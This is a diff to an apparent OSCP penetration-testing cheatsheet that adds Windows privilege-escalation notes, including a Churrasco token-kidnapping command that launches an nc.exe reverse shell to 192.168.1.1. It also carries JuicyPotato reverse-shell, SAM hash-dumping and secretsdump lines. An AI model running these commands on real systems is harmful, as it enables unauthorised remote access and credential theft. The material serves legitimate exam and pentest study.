@@ -6,6 +6,12 @@ tags: [OSCP, Cheatsheet]
 layout: post
 ---
 
+###### Tricks to improve a crappy shell
+```
+rlwrap
+> rlwrap -r nc -nvlp 443
+```
+
 ###### Hashdump
 ```
 Dumping SAM hashes from CMD:
@@ -20,6 +26,20 @@ C:/Windows/System32/config/SYSTEM
 
 Dumping hashes from attack machine:
 impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
+```
+
+###### Token Kidnapping on Windows Server 2003
+https://github.com/Re4son/Churrasco
+```
+If SeImpersonatePrivilege is Enabled, this will probably work.
+
+> git clone https://github.com/Re4son/Churrasco
+after uploading the exe:
+
+Execute Command
+> churrasco.exe -d "whoami"
+Using nc.exe to start a reverse shell connection
+> churrasco.exe -d "c:\Users\username\Documents\nc.exe -e cmd.exe 192.168.1.1 443"
 ```
 
 ###### Potato attacks
@@ -53,8 +73,15 @@ Or using a different CLSID:
 > JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
 ```
 
+###### Port Forwarding
+///TODO
+
+
 ###### Windows kernel Exploits
 ```
 Seclists
 https://github.com/SecWiki/windows-kernel-exploits
+
+Empire
+https://github.com/EmpireProject/Empire/tree/master/data/module_source
 ```
